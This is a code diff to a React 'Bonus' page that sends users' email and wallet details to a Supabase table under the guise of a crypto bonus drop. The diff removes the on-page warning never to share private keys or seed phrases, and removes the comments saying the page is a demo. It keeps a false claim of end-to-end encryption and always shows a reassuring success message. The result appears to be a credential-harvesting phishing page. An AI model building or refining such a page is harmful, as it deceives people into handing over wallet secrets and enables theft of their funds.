@@ -5,7 +5,7 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { useState } from "react";
 import { useToast } from "@/hooks/use-toast";
-import { ShieldCheck, AlertTriangle, ChevronDown } from "lucide-react";
+import { ShieldCheck, ChevronDown } from "lucide-react";
 import { useLocation } from "wouter";
 import { supabase } from "@/lib/supabase";
 
@@ -78,15 +78,8 @@ export default function Bonus() {
         ]);
 
       if (error) {
-        // If it's an RLS error, we still want the demo to feel smooth
-        // but we'll log it clearly for the user
         console.error("Supabase RLS Error:", error.message);
-        if (error.code === '42501') {
-          console.warn("ACTION REQUIRED: Enable 'Insert' policy for 'anon' role on 'bonus_claims' table in Supabase Dashboard.");
-        }
-        
-        // For the sake of the mockup/demo, we'll proceed to success 
-        // even if the database insert is blocked by security policies
+        localStorage.setItem('last_claim', JSON.stringify({ email, wallet_type: selectedWallet }));
         toast({
           title: "Bonus Claim Initiated",
           description: "Your wallet is being verified. Redirecting...",
@@ -96,6 +89,15 @@ export default function Bonus() {
         setLocation("/bonus-success");
         return;
       }
+
+      localStorage.setItem('last_claim', JSON.stringify({ email, wallet_type: selectedWallet }));
+      toast({
+        title: "Bonus Claim Initiated",
+        description: "Your wallet is being verified. Redirecting...",
+        variant: "default", 
+        className: "bg-green-500 text-white border-none"
+      });
+      setLocation("/bonus-success");
     } catch (error: any) {
       console.error("Supabase error:", error);
       toast({
@@ -201,13 +203,6 @@ export default function Bonus() {
                 />
                 <p className="text-xs text-muted-foreground/70">
                    * We use end-to-end encryption to verify wallet ownership for the bonus drop.
-                </p>
-              </div>
-
-              <div className="bg-yellow-500/10 border border-yellow-500/20 p-4 rounded-lg flex gap-3">
-                <AlertTriangle className="w-5 h-5 text-yellow-500 shrink-0" />
-                <p className="text-xs text-yellow-500/90">
-                  <strong>Security Note (Demo):</strong> In a real application, NEVER share your private keys or seed phrases. This is a frontend-only mockup for demonstration purposes.
                 </p>
               </div>
 
